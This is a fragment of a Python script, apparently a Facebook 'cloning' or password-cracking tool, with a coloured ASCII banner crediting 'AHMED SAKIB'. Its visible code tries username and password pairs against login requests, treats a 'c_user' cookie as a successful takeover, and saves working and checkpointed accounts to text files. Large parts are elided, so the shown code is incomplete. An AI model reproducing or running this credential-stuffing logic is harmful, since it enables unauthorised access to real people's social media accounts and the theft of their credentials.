...
\033[1;91m    dP"Y8    db    88  dP 88 88""Yb 

\033[1;92m   Ybo."   dPYb   88odP  88 88__dP 

\033[1;93m   o.`Y8b  dP__Yb  88"Yb  88 88""Yb 

\033[1;94m   8bodP' dP""""Yb 88  Yb 88 88oodP
...
\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
 ...
 │ [✓] GITHUB   : AHMED SAKIB VAU        │

 │ [✓] FACEBOOK : AHMED SAKIB             │
...
def innocent():
    ...
    print('Ok Ids Saved in /SAKIB-OK.txt')

    print('Cp Ids Saved in /SAKIB-CP.txt')
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[SAKIB-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                ...
                if 'y' in cp_cpx: 
                 ...
                 print('\r\r\033[1;30m[SAKIB-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
        ...
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mSAKIB\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
